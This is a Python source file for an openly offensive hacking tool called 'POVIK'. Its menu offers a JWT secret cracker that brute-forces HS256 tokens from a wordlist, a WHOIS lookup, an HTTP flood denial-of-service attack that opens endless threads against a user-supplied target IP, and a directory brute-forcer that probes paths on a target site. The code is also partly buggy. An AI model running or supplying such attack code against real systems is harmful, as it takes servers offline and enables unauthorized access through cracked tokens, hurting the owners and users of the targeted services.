from colorama import Fore
import os
import time 
import platform
import requests
import ipapi
import pyfiglet
from requests import get
import base64
import jwt
import threading
import colorama
from colorama import Fore,init
from ipwhois import IPWhois
from pprint import pprint
import whois,socket

osuser = platform.uname()[0]
try:
    print(Fore.RED + "")
    if platform.uname()[0] == "Windows":
        os.system("cls")
        print (pyfiglet.figlet_format("POVIK"))
        print(Fore.LIGHTCYAN_EX+"Telegram: @M_CODING")
        print(Fore.RED+30*"-")
        time.sleep(2)
        print(Fore.RED+" ["+Fore.WHITE+"1"+Fore.RED+"]"+Fore.WHITE+" Jwt Cracker")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"2"+Fore.RED+"]"+Fore.WHITE+" Whois")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"3"+Fore.RED+"]"+Fore.WHITE+" Dos")
        time.sleep(0.2)
        print(Fore.RED+" ["+Fore.WHITE+"4"+Fore.RED+"]"+Fore.WHITE+" !")
        time.sleep(0.2)
        print(Fore.RED+30*"-")

        print(" ")
        reqest = int(input(Fore.GREEN+"┌──(povik)- : "+Fore.LIGHTCYAN_EX))
    #IP Public user
        def ip() :
            ip = requests.get("http://api.ipify.org/").text
            ip_location = ipapi.location(ip)['country']
        # jwt cracker
        if reqest == 1:
            os.system("cls")
            encoded = input(colorama.Fore.RED+" [?] " + colorama.Fore.WHITE + "Enter encoded payload:")
            wordlist = input(colorama.Fore.RED+" [?] " + colorama.Fore.WHITE + "Path to wordlist:").rstrip()
            with open(wordlist) as secrets:
                for secret in secrets:
                    try:
                        payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
                        print ("!! WINNER WINNER CHICKEN DINNER !!")
                        print ("** " + secret.rstrip() + " **")
                        print (payload)
                        break
                    except jwt.InvalidTokenError:
                        print ("Invalid Token - ") + secret.rstrip()
                    except jwt.DecodeError:
                        print ("Decoding Error - ") + secret.rstrip()
                    else:
                        print ("Uncaught Exception - ") + secret.rstrip()

    # WHOIS
    if reqest == 2:
        site = input(Fore.GREEN+"\n [?] "+Fore.WHITE+" Enter Target Domain : "+Fore.LIGHTCYAN_EX)
        ip = socket.gethostbyname(site)
        info = IPWhois(ip)
        info = info.lookup_whois()


        print("Server Information :\n")

        print(Fore.GREEN+"Target IP : "+Fore.RED + ip + Fore.WHITE)
        pprint(info)

        print("-------------------------")

        res = whois.whois(site)
        print("""
        --------------
        Domain Information :
        --------------

        """)
        pprint(res)

    if reqest == 3:
        import socket,os,time
        init()
        target =  input(Fore.GREEN+"\n [?] "+Fore.WHITE+"Enter Target ip : \n ")
        fake_ip = "40.51.10.2"
        port = 80
        counter = 0
        def attack():
            while True:   
                    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.connect((target,port))
                    s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode("ascii"),(target,port))
                    s.sendto(("Host:"+fake_ip+"\r\n\r\n").encode("ascii"),(target,port))
                    global counter
                    counter += 1
                    print(f" {Fore.RED} Pcket {str(counter) } sent !  \n")
                    s.close()         

        print(" [            ] 0%")
        time.sleep(1)
        print(" [===         ] 20%")
        time.sleep(1)
        print(" [========    ] 60%")
        time.sleep(1)
        print(" [============] 100%")
        time.sleep(1)
        print("Attack Start ....")
        time.sleep(1)
        for i in range(99999999):
            thread = threading.Thread(target=attack)
            thread.start()
            time.sleep(2)    

    if reqest == 4:
        init()
        site = input("Enter a Target Site Url : ")
        site = "http://"+site
        Urls = input(" Enter a Urls File : ")
        Urls = open(Urls,"r").read().splitlines()
        for url in Urls:
            full_address = site+"/"+url
            respons = get(full_address)
            if respons.status_code == 200:
                print(f" {Fore.GREEN} {full_address} is Exsists ====> 200 {Fore.RESET}")
            else:
                print(f" {Fore.RED} {full_address} Not Found ! ======> 400 {Fore.RESET}")
        

    #error
except ValueError:
    print(Fore.YELLOW+"\n [ValueError]"+Fore.RED+" enter yrue value")
except KeyboardInterrupt:
    print(Fore.YELLOW+"\n [KeyboardInterrupt]"+Fore.RED+" EXIT USER()")
    exit()
except ModuleNotFoundError:
    print(Fore.YELLOW+"\n [ModuleNotFoundError]"+Fore.RED+" read help")
except SyntaxError:
    print(Fore.YELLOW+"\n [SyntaxError]"+Fore.RED+" Error for POVIK, please try agin")
except FileNotFoundError:
    print(Fore.YELLOW+"\n [File notfound]"+Fore.RED+" check the location password list")
    #user enter